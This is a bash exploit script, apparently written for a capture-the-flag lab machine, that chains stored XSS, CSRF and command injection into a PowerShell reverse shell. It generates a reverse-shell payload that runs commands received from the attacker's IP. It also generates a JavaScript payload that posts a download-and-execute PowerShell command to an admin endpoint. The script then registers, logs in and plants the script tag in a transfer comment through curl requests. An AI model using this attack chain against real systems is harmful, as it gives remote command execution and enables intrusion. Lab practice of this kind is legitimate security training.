#!/bin/bash

# XSS to CSRF
#
echo "QEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBA
QEBAQEBAQEBAQEBAQEBAQEBAQEBAQEAKQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBA
QEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEAKQEBAQEBAQEBA
QEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBA
QEBAQEBAQEBAQEBAQEAKQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBA
QEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEAKQEBAQEBAQEBAQEBAQEBAQEBA
QEBAQEBAQEBAQEBAQEBAQEBAQCAgICAgICAgQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBA
QEBAQEAKQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEAgIC8gICAgICAsICBAQEBA
QEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEAKQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBA
QEBAQEBAQEAgICAgQEBAQCAgICBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEAKQEBA
QEBAQEBAQEBAQEBAQEBAQEBAQEBAIEBAQEAvQEBAKCAgICBAQEBAQEAgICAgLEBAQChAQEAvIEBA
QEBAQEBAQEBAQEBAQEBAQEBAQEAKQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAICAgICBAQCAgICAg
ICwsIEBAICAoICAgICAgQEAgICAgIEBAQEBAQEBAQEBAQEBAQEBAQEBAQEAKQEBAQEBAQEBAQEBA
QEBAQEBAQEBAQEBAICBAQEBAICAqQCAgICAgICAgICAgICBAQCAgIEBAQEAgQEBAQEBAQEBAQEBA
QEBAQEBAQEBAQEAKQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAICBAQEBAQEAgICBAQEBAQEBAQEBA
QEAgIC5AQEBAQEAgIEBAQEBAQEBAQEBAQEBAQEBAQEBAQEAKQEBAQEBAQEBAQEBAQEBAQEBAQEBA
QEBAICBAQEBAQCAgICAgICAgIEBAICAgICAgICBAQEBAQCAgQEBAQEBAQEBAQEBAQEBAQEBAQEBA
QEAKQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQCAgQC4gICAgICAgICAgQCAgICAgICAgICAgICBA
QCAgQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEAKQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQCAgICAg
ICAgICAuJUAsICAgICAgICAgICAgICAgICAqQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEAKQEBAQEBA
QEBAQEBAQEBAQEBAQEBAQEBAQCAgICBAQEBAQEBAQEBAKiAgICAgICAgICAgICAgICAgQEBAQEBA
QEBAQEBAQEBAQEBAQEBAQEAKQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQCAgICBAQEBAQEBAQEBA
ICAgICAgIChAQCAgICAgICAgQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEAKQEBAQEBAQEBAQEBAQEBA
QEBAQEBAQEBAQCAgICAgQEBAQEBAQEAgICAgICAgICAgICAgICAgICAgQEBAQEBAQEBAQEBAQEBA
QEBAQEBAQEAKQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQCUgICAgLEAuICAgICAgICAgICAgICAg
ICAgICAgICBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEAKQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBA
QEBAICBAICAgICAgICAgICAgICAgICAgICAgICAgIEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEAK
QEBAQEBAQEBAQEBAQEBAQEBAQCgqQEBAQEBAJUAgICAgICAgICAgICYgICAgICAgICAgICAsQEBA
QEBAJiBAQEBAQEBAQEBAQEBAQEBAQEAKQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBA
ICAgICAgICAgICAgICAgIEBAQEBAQEBAQCBAQEBAQEBAQEBAQEBAQEBAQEBAQEAKQEBAQEBAQEBA
QEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAKiAgICAgICAgQEBAQEBAQEBAQEBAQEBAQEBAQEBA
QEBAQEBAQEBAQEBAQEAKQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAICAgICAgICBAQEBAQEBAQEBA
QEBAQEBAQCAgICAgICAgQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEAKQEBAQEBAQEBAQEBAQEBAQEBA
QEBAQEBAQEBAICAgQCggIEBAIEBALEBAQEAgQEAgICAsICAgIEBAQEBAQEBAQEBAQEBAQEBAQEBA
QEBAQEAKQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQCAjQC4gQEAgQEAgQEBAQEBA
QEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEAKQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBA
QEBAQEBAQEBAKCxAQCBAICBAQCBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEAKQEBA
QEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQCAgQEAgQEBAQEBAJkBAIEBAIC5AQEBAQEBAQEBA
QEBAQEBAQEBAQEBAQEBAQEBAQEAKQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAKCAgICAgQEBAQEBA
QEBAQEBAQEBAQEBAQEAgJSAgQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEAKQEBAQEBAQEBAQEBA
QEBAQEBAQEBAQEBAQEAgL0BAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAKCAgKEBAQEBAQEBAQEBA
QEBAQEBAQEBAQEAKQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBA
QEBAQEBAQEBAQEBAIEBAQEBAQEBAQEBAQEBAQEBAQEBAQEAKQEBAQEBAQEBAQEBAQEBAQEBAQEBA
QEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBA
QEAKQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBA
QEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEAK" | base64 -d

sleep 1
echo "Creating powershell payload..."

attacker_ip="10.10.14.51"
attacker_port="9000"

cat << "EOF" > ps_pay.ps1
function blacktabby 
{ 
    
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $go,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )

    
    try 
    {
        
        if ($go)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }


        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2020 BlackCats Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        
        $sendbytes = ([text.encoding]::ASCII).GetBytes('BlackTabby ' + (Get-Location).Path + '->')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                #Execute the command on the target.
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Error $_
            }
            $sendback2  = $sendback + 'BlackTabby ' + (Get-Location).Path + '-> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Error $_
    }
}
EOF

echo "blacktabby -go -IPAddress $attacker_ip -Port $attacker_port" >> ps_pay.ps1
echo "Creating Javascript payload..."

cat << EOF > js_pay.js
var xhr = new XMLHttpRequest();
var url = "http://localhost/admin/backdoorchecker.php";
var params = "cmd=dir | powershell -exec bypass -C \"IEX(New-Object Net.WebClient).downloadString('http://$attacker_ip:8000/ps_pay.ps1')\"";
xhr.open("POST",url);
xhr.setRequestHeader("Content-Type","Application/x-www-form-urlencoded")
xhr.withCreentials = true;
xhr.send(params);
EOF
echo "Starting webserver to serve payload as background job..."
sleep 5
echo "Attemping to create account..."
PAYLOAD="<script+src%3dhttp%3a//10.10.14.51%3a8000/js_pay.js></script>"

python3 -m http.server 8000 &
SERVER_PID=$!

curl -i -s -k -X $'POST' \
    -H $'Host: 10.10.10.154' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://10.10.10.154/index.php?msg=Succesfully%20logged%20out' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 57' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' \
    --data-binary $'username=support71&password=support71&pounds=Submit+Query' \
    $'http://10.10.10.154/register.php' -L -m 5

echo "logging in"

curl -i -s -k -X $'POST' \
    -H $'Host: 10.10.10.154' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://10.10.10.154/index.php?msg=User%20created.' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 60' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' \
    --data-binary $'username=support71&password=support71&pounds=Submit+Query' \
    $'http://10.10.10.154/login.php' -L -m 5 -c cookies.txt

echo "sending payload?"

curl -i -s -k -X $'POST' \
    -H $'Host: 10.10.10.154' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://10.10.10.154/user/' -H $'Content-type: application/x-www-form-urlencoded' -H $'Content-Length: 87' -H $'Connection: close' -H $'Cookie: id=3; username=c3VwcG9ydDcx; password=c3VwcG9ydDcx' \
    -b cookies.txt \
    --data-binary $"fromId=3&toId=1&amount=1&comment=$PAYLOAD" \
    $'http://10.10.10.154/user/transfer.php'

echo "Start Netcat Listener on $attacker_port"
echo "Sleeping for 3 mins while payload is triggered"
sleep 180
echo "Stopping webserver..."
echo "cleaning up payloads"
rm -f js_pay.js
rm -f ps_pay.ps1
rm -f cookies.txt
kill -9 $SERVER_PID

